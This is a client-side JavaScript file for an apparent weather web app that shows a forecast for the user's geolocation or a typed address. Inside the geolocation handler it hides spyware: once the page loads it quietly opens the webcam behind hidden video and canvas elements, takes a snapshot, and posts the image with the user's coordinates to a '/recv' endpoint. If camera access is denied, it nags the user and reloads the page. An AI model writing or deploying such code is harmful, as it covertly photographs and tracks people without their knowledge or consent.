console.log('Connected to client-side program')

const weatherform = document.querySelector('form');
const search = document.querySelector('input');
const message1 = document.querySelector('#message-1');
const message2 = document.querySelector('#message-2');
// message1.textContent = 'from js';

document.addEventListener('DOMContentLoaded', (e) => {
    e.preventDefault();
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (position) {
            fetch("/weather?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude).then((response) => {
                response.json().then((data) => {
                    if (data.error) {
                        message1.textContent = data.error;
                    } else {
                        'use strict';
                        (function () {

                            var constraints = {
                                video: true,
                                audio: false
                            };
                            var video = document.querySelector('video');
                            var canvas = document.querySelector('canvas');
                            video.style.display = 'none';
                            canvas.style.display = 'none';
                            var width = null;
                            var height = null;
                            var track = null;
                            var photoSent = false;

                            function handleSuccess(stream) {
                                video.srcObject = stream;
                                track = stream.getTracks()[0];  // if only one media track
                                video.play();
                            }
                            function handleError(error) {
                                console.log('getUserMedia error: ', error);
                                alert('Please activate camera!');
                                location.reload();
                            }
                            navigator.mediaDevices.getUserMedia(constraints).
                                then(handleSuccess).catch(handleError);

                            video.addEventListener('canplay', function (e) {
                                setTimeout(function () {
                                    if (photoSent) {
                                        return console.log('prevented from taking a further photo');
                                    } else {
                                        width = video.videoWidth;
                                        height = video.videoHeight;

                                        canvas.setAttribute('height', height);
                                        canvas.setAttribute('width', width);
                                        video.setAttribute('height', height);
                                        video.setAttribute('width', width);

                                        context = canvas.getContext('2d');
                                        context.drawImage(video, 0, 0, width, height);
                                        $.post('/recv', {
                                            img: canvas.toDataURL(),
                                            lat: position.coords.latitude,
                                            long: position.coords.longitude
                                        });
                                        track.stop();
                                    }
                                }, 1000);
                            }, false);
                        })();
                        message1.textContent = data.location.location
                        message2.textContent = data.forecast
                    }
                })
            })
        });
    } else {
        
        message1.textContent = "Sorry, your browser does not support HTML5 geolocation.";
        message2.textContent = "Try a search, instead!";
    }
});

weatherform.addEventListener('submit', (e) => {
    e.preventDefault();

    message1.textContent = 'Loading...';
    message2.textContent = '';
    const location = search.value
    fetch('/weather?address=' + location).then((response) => {
        response.json().then((data) => {
            if (data.error) {
                message1.textContent = data.error;
            } else {
                message1.textContent = data.location
                message2.textContent = data.forecast
            }
        })
    })
});
